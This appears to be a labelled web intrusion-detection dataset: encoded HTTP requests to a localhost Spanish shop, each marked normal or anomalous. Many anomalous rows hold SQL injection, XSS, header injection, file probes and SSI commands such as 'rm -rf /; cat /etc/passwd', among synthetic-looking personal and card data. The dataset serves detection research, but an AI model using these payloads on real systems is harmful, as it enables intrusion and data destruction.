localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = edlin4 & password = 5oy6nte & nombre = ralston & apellidos = peñafiel & email = valente . oray @ enlapalma . com . sh & dni = 91076650p & direccion = publicista + jose + alegria + 156 +  & ciudad = alhambra & cp = 09109 & provincia = cuenca & ntca = 2136567392890327 & b1 = registrar,1
"localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 1 & nombre = vino + rioja & precio = 39 & cantidad = 77 '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  -  & b1 = añadir + al + carrito",1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 2 & nombre = vino + rioja & precio = 85 & cantidad = 18 & b1a = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 2 & nombre = vino + rioja & precio = 100 & cantidad =  '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  -  & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = takagi71 & pwd = b6e & remember =  '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  -  & b1 = entrar,1
"http :  /  / localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = srirupa0 & password = cicl $ orama & nombre = catherin & apellidos = lladonosa + uchuya & email = lowenadler @ videoerotic . fm & dni = 80206705r & direccion = santa + maria + 39 ,  +  & ciudad = tubilla + del + agua & cp = 09345 & provincia = segovia & ntc = 6691224981329483 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = eluned & pwd = p8pah7g6 & remember = on & b1a = entrar,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 7879 & b1a = pasar + por + caja,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 2 & nombre = ques + o + manchego & precio = 85 & cantidad = 79 & b1 = añadir + al + carrito,1
"http :  /  / localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = corsale & password = 0or1n3 & nombre = radames & apellidos = martos & email = lessen _ wyss @ rockefeller . lk & dni = 56664191b & direccion = c /  + clavos ,  + 46 ,  + 4g & ciudad = pozohondo & cp = 34820 & provincia = guipúzcoa & ntc = 4254370218247053 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = mylo & pwd = bacin4ll0 & remember = on /  & b1 = entrar,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 2 & nombre = ques + o + manchego & precio = 85 & cantidad = 9 & b1 = añadir + al + carrito,1
http :  /  / localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = downes & pwd = c88ad8r & remember = on & b1 = entrar,0
"http :  /  / localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = klement & password = guedejona & nombre = patricio & apellidos = saldaña + caral & email = hannon . white8 @ mtos . st & dni = 01806767w & direccion = calle + sapporo ,  + 129 + 12e & ciudad = dios + le + guarde & cp = 18550 & provincia = barcelona & ntc = 5215154184389429 & b1 = registrar",0
http :  /  / localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 1862 & b1 = pasar + por + caja,0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = grimshaw & pwd = 84m3ri156 & remembera = on & b1 = entrar,1
http :  /  / localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 6906 & b1 = confirmar,0
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 & nombre = vino + rioja & precio = 39 & cantidad = 41 & b1a = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & logina = temp & pwd = tel7tipo & remember = off & b1 = entrar,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 1 /  & nombre = vino + rioja & precio = 85 & cantidad = 38 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 1 /  & nombre = jamón + ibérico & precio = 100 & cantidad = 86 & b1 = añadir + al + carrito,1
http :  /  / localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = ankur & password = es4ila & nombre = teodorico & apellidos = rodríguez + sacrista & email = melville . bancroft @ biopoint . us & dni = 71095616v & direccion = c /  + doctor + muñoz + fernandez + 194 + 12b & ciudad = chilluévar & cp = 09640 & provincia = zaragoza & ntc = 5311990714913176 & b1 = registrar,0
localhost : 8080 / asf - logo - wide,1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = scottie ""  + and +  "" 1 ""  =  "" 1 & password = mi2l1nési6o & nombre = eros & apellidos = alcina + carameso & email = rawlings8 @ tantomontamontatanto . bu & dni = 39890773x & direccion = paraguay + 122 ,  +  & ciudad = villalba + de + guardo & cp = 39085 & provincia = barcelona & ntc = 6182221235655395 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = viswa & pwd = 0sc9d25 . 2 & remember = on /  & b1 = entrar,1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login =  ' d * al ? ia & password = m5x0e & nombre = nimsi & apellidos = catà + viera & email = talbot _ polani @ clichotel . sj & dni = 56967582d & direccion = avenida + industria + 48 ,  + 12h & ciudad = sant + martí + de + riucorb & cp = 44124 & provincia = zaragoza & ntc = 5246598463194503 & b1 = registrar",1
http :  /  / localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = epting & password = e4v3ne54m8e0t8 & nombre = rafferty & apellidos = calaf + ugartechea & email = marinangeli @ didacramirez . tt & dni = 39582069n & direccion = coso + 71 + 2h & ciudad = algueña & cp = 19243 & provincia = cuenca & ntc = 0182727346099152 & b1 = registrar,0
localhost : 8080 / tienda1 / imagenes / 1 . gif / 4861362529278789730 . inc,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 3 & nombrea = jamón + ibérico & precio = 39 & cantidad = 66 & b1 = añadir + al + carrito,1
"localhost : 8080 / tienda1 / publico / anadir . jspid = 3 & nombre = vino + rioja & precio = 85 & cantidad = 80 & b1 =  ""  >  < ! -  -  # exec + cmd =  "" dir +  ""  -  -  >  < ",1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 2 & nombre = vino + rioja & precioa = 100 & cantidad = 97 & b1 = añadir + al + carrito,1
http :  /  / localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 6461 & b1 = pasar + por + caja,0
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = bau * gnon & password = prusiato & nombre = samia & apellidos = catalayud + mirabet & email = balademas . mareuil6 @ enlanzarote . com . vc & dni = 28178710f & direccion = c /  + cala ,  + 9 ,  +  & ciudad = mutxamel & cp = 25332 & provincia = zaragoza & ntc = 8608089924764976 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / anadir . jspid = 2 & nombre = queso + manchego & precio = 39 /  & cantidad = 71 & b1 = añadir + al + carrito,1
http :  /  / localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 1 & nombre = queso + manchego & precio = 85 & cantidad = 86 & b1 = añadir + al + carrito,0
http :  /  / localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 4199 & b1 = pasar + por + caja,0
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login =  ""  + and +  "" 1 ""  =  "" 1 & password = surcañ * o & nombre = emerio & apellidos = abajo + witron & email = ammelrooy @ mariposasentudia . travel & dni = 46405415v & direccion = avinguda + puigfred + 108 ,  +  & ciudad = san + cristóbal + de + la + cuesta & cp = 09471 & provincia = valencia & ntc = 0824087698765397 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 5934 & b1 = pasar + por + caja / ,1
http :  /  / localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 2789 & b1 = pasar + por + caja,0
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = wendy & password = a - hílo & nombre = edelvais & apellidos = albañil + comasoli & email =  @ ha @ nks @ raullaza @ ro . mc & dni = 68675744k & direccion = puerto + de + canfranc + 179 ,  +  & ciudad = montón & cp = 12415 & provincia = guadalajara & ntc = 8960280484576559 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = azzuolo & pwda = atrabiliario & remember = off & b1 = entrar,1
http :  /  / localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = aideen & pwd = 22s281t9l21o & remember = off & b1 = entrar,0
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = pepple & password = endelgadecer & nombre = nolsaco & apellidos = antolínez + tamallangos & email = hassall @ 007tv . nf & dni = 80856285s & direccion = c /  + capitanes + ripoll ,  + 68 ,  + 9 - g & ciudad = pajaroncillo & cpa = 01120 & provincia = madrid & ntc = 3246974816793870 & b1 = registrar",1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = nitin & password = r4mitir & nombre = lionel & apellidos = teixidor + modrego & email = creach @ vindexexpo . gr & dni = 37118814b & direccion = c /  + joaquin + arjona + 70 ,  +  & ciudad = rionegro + del + puente & cp = 49639 & provincia = barcelona & ntc =  < ! -  -  # exec + cmd =  "" rm +  - rf +  /  ; cat +  / etc / passwd ""  +  -  -  >  & b1 = registrar",1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 1 & nombre = vino + riojaany ? set - cookie :  + tamper = 1041264011025374727 & precio = 39 & cantidad = 73 & b1 = añadir + al + carrito,1
http :  /  / localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = ostifich & pwd = discreción & remember = on & b1 = entrar,0
http :  /  / localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = van _ gaal & pwd = repti9 & remember = off & b1 = entrar,0
localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = cyndi & password = suburbicario & nombre = quimey & apellidos = múzquiz + metauten & email = mars @ visualreality . au & dni = 05744913l & direccion = calle + palacios + 28 +  & ciudad = orba & cp = 40180 & provincia = cantabria & ntc = 9263586426997442 & b1a = registrar,1
localhost : 8080 / tienda1 / publico / caracteristicas . jsp ? id =  | ,1
http :  /  / localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = meng & pwd = 5r02a818 & remember = off & b1 = entrar,0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = perkins & pwd = 7ad524z & remember = on /  & b1 = entrar,1
http :  /  / localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 3486 & b1 = confirmar,0
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = dulsea & pwd = puzolana & remember =  +  & b1 = entrar,1
localhost : 8080 / tienda1 / miembros / editar . jsp / asf - logo - wide . gif,1
http :  /  / localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 6159 & b1 = pasar + por + caja,0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 3076 & b1 = pasar + por + caja / ,1
localhost : 8080 / tienda1 / imagenes / logo . gif / asf - logo - wide . gif /  . old,1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & logina = laforge & pwd = o1r8me956 & remember = off & b1 = entrar,1
http :  /  / localhost : 8080 / tienda1 / publico / anadir . jspid = 2 & nombre = vino + rioja & precio = 39 & cantidad = 11 & b1 = añadir + al + carrito,0
http :  /  / localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = stanley & password = chupada & nombre = marco & apellidos = llargues & email = twohill _ richards @ benadressa . vu & dni = 30536267h & direccion = moll + de + petrolers + 139 +  & ciudad = arbancón & cp = 31284 & provincia = ávila & ntc = 8843476140165656 & b1 = registrar,0
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = zadow & password = alternaci - 59 & nombre = gyana & apellidos =  / bullones + masnou & email = bushell @ sayuela . uk & dni = 23485919k & direccion = c /  + juan + ii ,  + 108 + 12 ? c & ciudad = inviernas ,  + las & cp = 37428 & provincia = tarragona & ntc = 0299500452895556 & b1 = registrar",1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = veriee & password = zabalm * edina & nombre = septimo & apellidos = juanico + castro & emaila = fleming _ sayce @ miami - beach . com . kz & dni = 44614622g & direccion = c /  + minerva ,  + 177 ,  + 1 - c & ciudad = viñuelas & cp = 22280 & provincia = palencia & ntc = 3985053598089908 & b1 = registrar",1
localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = guendole & password = picoteado & nombre = calixta & apellidos = berguío + franceschini & email = blume1 @ g - audi . np & dni = 37147257a & direcciona = cronista + ildefonso + rodriguez + 103 +  & ciudad = ispaster & cp = 24322 & provincia = zaragoza & ntc = 3071106416830045 & b1 = registrar,1
"http :  /  / localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = mahoney - 7 & password = 78co2 $ 57ad1 & nombre = akemi & apellidos = osuna + cuellar & email = cejvan @ tagarautomation . name & dni = 24972017c & direccion = ronda + capuchinos + 112 ,  +  & ciudad = ledigos & cp = 33197 & provincia = teruel & ntc = 1636404062174246 & b1 = registrar",0
http :  /  / localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = tates5 & pwd = p71m51 & remember = off & b1 = entrar,0
localhost : 8080 / tienda1 / publico / pagar . jspmodoa = insertar & precio = 2373 & b1 = confirmar,1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = chiquia0 & password = 1a6com39 & nombre = walerico & apellidos = siurana + muntana & email = kommissarov @ purplemoongrn . mw & dni = 21946220b & direccion = plazuela + aldabe + 25 ,  + 7 ? h & ciudad = baena & cp = 42294 & provincia = lleida & ntca = 6531738879978731 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / anadir . jspid =  ?  & nombre = queso + manchego & precio = 100 & cantidad = 48 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / imagenes / asf - logo - wide . gif . inc,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 2 & nombre = jamón + ibérico & precio = 39 & cantidad = 75 & b1 = añadir + al + carrito | ,1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & logina = byran & pwd = pringoso & remember = off & b1 = entrar,1
"http :  /  / localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = yoshimi & password = 0a4254 & nombre = alpiniano & apellidos = dot + catolino & email = gonshaw @ legami . ac & dni = 48194765j & direccion = glorieta + alcorlo ,  + 60 ,  +  & ciudad = pedrera & cp = 32320 & provincia = zamora & ntc = 3792625093300493 & b1 = registrar",0
"http :  /  / localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = hardage & password =  _ abarloar & nombre = spencer & apellidos = formenti & email = bridge - sanford @ aeag . cn & dni = 04549345z & direccion = francoli + 148 ,  +  & ciudad = amurrio & cp = 39627 & provincia = soria & ntc = 9379365296048571 & b1 = registrar",0
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = alix & password = veni!a & nombre = imelda & apellidos = delbón + coll & email = holister @ brunoseguridad . cf & dni = any ? set - cookie :  + tamper = 1041264011025374727 & direccion = plza .  + noria + de + la + huerta + 68 ,  +  & ciudad = alcudia + de + veo & cp = 28690 & provincia = ávila & ntc = 6551003767368321 & b1 = registrar",1
http :  /  / localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 6648 & b1 = pasar + por + caja,0
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = program & password = 9bocelado & nombre = kasuhiro & apellidos = argandoña + cobo & email = dufour _ mannhardt @ privatebanking . com . us & dni = 33671238c & direccion = ayuntamiento ,  + 88 ,  +  & ciudad =  '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  -  & cp = 34191 & provincia = navarra & ntc = 8395803626511609 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 5305 & b1 = confirmar / ,1
http :  /  / localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 6693 & b1 = pasar + por + caja,0
"http :  /  / localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = loveday & password = 2r5o & nombre = leonor & apellidos = bellpuig & email = sylvester @ chevrolet - volt . yu & dni = 27243677q & direccion = avda .  + santo + angel + de + la + guarda ,  + 11 + 8 ? c & ciudad = vilalba & cp = 37891 & provincia = cáceres & ntc = 5348568064095524 & b1 = registrar",0
localhost : 8080 / tienda1 / global / menum . jsp / 4861362529278789730,1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = mayi & password = r75ar & nombre = alenka & apellidosa = cejas + torra & email = kobe @ techdata . com . pg & dni = 75925253e & direccion = calle + casas + viejas + 73 +  & ciudad = torres + de + cotillas ,  + las & cp = 08731 & provincia = navarra & ntc = 1803474685764017 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 9805 & b1 = pasar + por + caja < script > alert (  "" paros ""  )  ;  <  / script > ",1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 & nombre = vino + rioja & precio = 85 & cantidad = 98 & b1 = añadir + al + carrito ,1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = einersen & password = despagada & nombre = emanuel & apellidos = sarrasec + arévalo & email = gottowt @ enibiza . com . es & dni = 96118316m & direccion = passatge + del + sol ,  + 0 + 13 ? d & ciudad = megeces & cp = 42148 & provincia =  ? cád ? i / z & ntc = 8462242772116416 & b1 = registrar",1
"http :  /  / localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = nanete & password = agradador & nombre = lope & apellidos = passow + salaberri & email = magnan @ purplemoongrn . lc & dni = 94039028d & direccion = calle + batllori ,  + 156 ,  +  & ciudad = font - rubí & cp = 45638 & provincia = burgos & ntc = 5675004716308928 & b1 = registrar",0
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = mcdowall & password = 7820ituir & nombre = s , ilvestre & apellidos = irigoyen + bombardó & email = rueda . unicorn @ tiposdedrogas . je & dni = 92997163k & direccion = avenida + san + ignacio + de + loyola + 128 + 8 ? c & ciudad = chilluévar & cp = 05279 & provincia = barcelona & ntc = 0602317509119469 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 2 & nombre = queso + manchego & precio = 85 & cantidad = 5 & b1 = añadir + al + carrito < script > alert (  "" paros ""  )  ;  <  / script > ",1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 1012 ' injected _ param & b1 = pasar + por + caja,1
http :  /  / localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 & nombre = jamón + ibérico & precio = 85 & cantidad = 3 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = abdullah & pwda = corcusido & remember = on & b1 = entrar,1
http :  /  / localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = ying - cdi & pwd = gosipina & remember = on & b1 = entrar,0
"http :  /  / localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = mabelle & password = motacén & nombre = tsuneko & apellidos = ayllon + bermejo & email = binney8 @ telogis . lb & dni = 39446407g & direccion = plazuela + de + cecilia + morillas + 76 ,  +  & ciudad = fuentesecas & cp = 07001 & provincia = castellón & ntc = 3094251434190883 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 2561 & b1 = pasar + por + caja / ,1
"http :  /  / localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = guojie & password = 37axis & nombre = natanel & apellidos = marsan + gallegos & email = conway @ womenatwork . zm & dni = 34173193t & direccion = calle + jose + maria + martinez + cachero ,  + 101 + 12 ? e & ciudad = corral + de + almaguer & cp = 44412 & provincia = ciudad + real & ntc = 8663389801268385 & b1 = registrar",0
http :  /  / localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 1 & nombre = vino + rioja & precio = 100 & cantidad = 16 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / imagenes / 2 . gif . bak,1
http :  /  / localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 2652 & b1 = confirmar,0
localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = detlef6 '  ;  + drop + table + usuarios ;  + select +  *  + from + datos + where + nombre + like +  '  %  & password = garrón & nombre = vigilio & apellidos = alcantara + campanin & email = padamsee @ comodindelhogar . no & dni = 71599604y & direccion = c /  + san + xoan + 115 +  & ciudad = ciguñuela & cp = 25737 & provincia = palencia & ntc = 7263738765493624 & b1 = registrar,1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = laila & password = r1al2e & nombre = hugo & apellidos = errazquin + riafrecha & email = grimpe @ lola - lutscht . to & dni = 56321696d & direccion = call * e + paredes + 89 ,  +  & ciudad = sancti - spíritus & cp = 24272 & provincia = zamora & ntc = 9680379821732985 & b1 = registrar",1
localhost : 8080 / tienda1 / global / asf - logo - wide,1
"localhost : 8080 / tienda1 / publico / anadir . jspid = 1 & nombre = vino + rioja & precio = 39 < script > alert (  "" paros ""  )  ;  <  / script >  & cantidad = 19 & b1 = añadir + al + carrito",1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 1 & nombre = jamón '  + ibéric -  ' o & precio = 39 & cantidad = 40 & b1 = añadir + al + carrito,1
http :  /  / localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = dung & pwd = 7i1ue39do & remember = off & b1 = entrar,0
localhost : 8080 / tienda1 / publico / entrar . jsperrormsg = credenciales + incorrectas + ,1
"http :  /  / localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = decleir & password = 0 * efa2l9c3d6 & nombre = secundino & apellidos = hernanz + llamusí & email = kitzmiller @ cenitsoria . bm & dni = 55831113q & direccion = calle + dante + alighieri + 162 ,  + 9 ? c & ciudad = martiherrero & cp = 35420 & provincia = la + rioja & ntc = 0889149915677492 & b1 = registrar",0
http :  /  / localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = yu & pwd = e5a9t7 & remember = on & b1 = entrar,0
http :  /  / localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = mazey & pwd = sobre846ida & remember = on & b1 = entrar,0
http :  /  / localhost : 8080 / tienda1 / publico / anadir . jspid = 3 & nombre = vino + rioja & precio = 85 & cantidad = 82 & b1 = añadir + al + carrito,0
"http :  /  / localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = wee - thon & password = 4asi258 & nombre = habib & apellidos = yebra + lores & email = shimada @ filtroselectroestaticos . es & dni = 50020791t & direccion = c /  + mar + caspio ,  + 187 + 9 - f & ciudad = baliarrain & cp = 50470 & provincia = soria & ntc = 0004533796646501 & b1 = registrar",0
"localhost : 8080 / tienda1 / publico / caracteristicas . jsp ? id = 2 '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  - ",1
localhost : 8080 / tienda1 / publico / caracteristicas . jsp ? id = anyset - cookie :  + tamper = 1041264011025374727,1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = berenice & pwda = enfeudación & remember = on & b1 = entrar,1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 1520 & b1a = confirmar,1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = angeline0 & password = tasajo & nombre = anatalón & apellidos = gironell + nurnberg & email = alari - clayton @ blueeyes . mm & dni = 02864580e & direcciona = c /  + pescadores + de + terranova ,  + 108 ,  + 9 - e & ciudad = gironella & cp = 34309 & provincia = lleida & ntc = 1940469779787284 & b1 = registrar",1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = vasiliad & password = e8cop762r & nombre = gilberto & apellidos = brzozowski & email = novis @ cementoscalibra . gy ?  & dni = 69084830y & direccion = av .  + del + cantabrico + 121 ,  + 2 ? b & ciudad = bergondo & cp = 10135 & provincia = lleida & ntc = 7240523818698482 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = tscha '  / j + a & pwd = duc9i89 & remember = on & b1 = entrar,1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & logina = digby & password = gusarapa & nombre = cilatal & apellidos = cusquisiban + ocifuente & email = saint - georges @ webhut . mh & dni = 51191165l & direccion = baixada + pontenova - freixeiro + 30 ,  +  & ciudad = portella ,  + la & cp = 37468 & provincia = burgos & ntc = 7735767005203893 & b1 = registrar",1
http :  /  / localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 381 & b1 = pasar + por + caja,0
"http :  /  / localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = rriocard & password = botionda & nombre = saira & apellidos = alférez + xuarra & email = christopher @ englishiseasy . mh & dni = 63899294g & direccion = pl .  + escritoras ,  + 88 +  & ciudad = valhermoso & cp = 10690 & provincia = alicante & ntc = 2278100372967643 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 5627 & b1 = confirmar / ,1
http :  /  / localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 & nombre = jamón + ibérico & precio = 39 & cantidad = 48 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = dorotich & password = encornadura & nombre = tránsito & apellidos = eynard + weffer & email = good @ permutatucasa . tv & dni = 11133160x & direccion = pl .  + flores + y + mariposas + 92 +  & ciudad = palafrugell & cp = 43830 & provincia = segovia & ntc = 8873151107958070 & b1a = registrar,1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = veen & password = sar * gentía & nombre = vigilio & apellidos = mitjavila + oca & email = g @ anor @  @ goscan @  . uz & dni = 29573614f & direccion = calle + ripolles + 83 ,  +  & ciudad = valderrábano & cp = 16812 & provincia = valencia & ntc = 7619192104254644 & b1 = registrar",1
"http :  /  / localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = emerson & password = entorcarse & nombre = nara & apellidos = selles + baqueró & email = debriac . krupka @ perrosmodelo . tz & dni = 40865502e & direccion = paseo + poeta + federico + garcia + lorca + 159 ,  +  & ciudad = navalilla & cp = 31195 & provincia = salamanca & ntc = 2255812100125453 & b1 = registrar",0
http :  /  / localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = alva & pwd = ba8lenero & remember = off & b1 = entrar,0
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = babatund & password = pa6omer9 - a < ! -  -  # exec + cmd =  "" ls +  /  ""  -  -  >  & nombre = juana + del + pilar & apellidos = luna + barberan & email = mazurowna @ wdsl . om & dni = 19546963e & direccion = villadangos + del + paramo ,  + 82 ,  +  & ciudad = encinas + de + esgueva & cp = 10830 & provincia = alicante & ntc = 5365738910346806 & b1 = registrar",1
localhost : 8080 / tienda1 / miembros / imagenes / ogono . jpg / 4861362529278789730 . old,1
localhost : 8080 / tienda1 / publico / 4861362529278789730 . inc,1
"http :  /  / localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = lukaszew2 & password = cele2t8a5 & nombre = amaia & apellidos = pubill + tena & email = maruzzo @ rtce . info & dni = 81791661g & direccion = c /  + joan + salvat + i + papaseit ,  + s / n +  & ciudad = pesaguero & cp = 05690 & provincia = león & ntc = 2693373375703320 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / caracteristicas . jsp ? id =  ' injected _ param,1
localhost : 8080 / webspheresamples / yourco / main . html,1
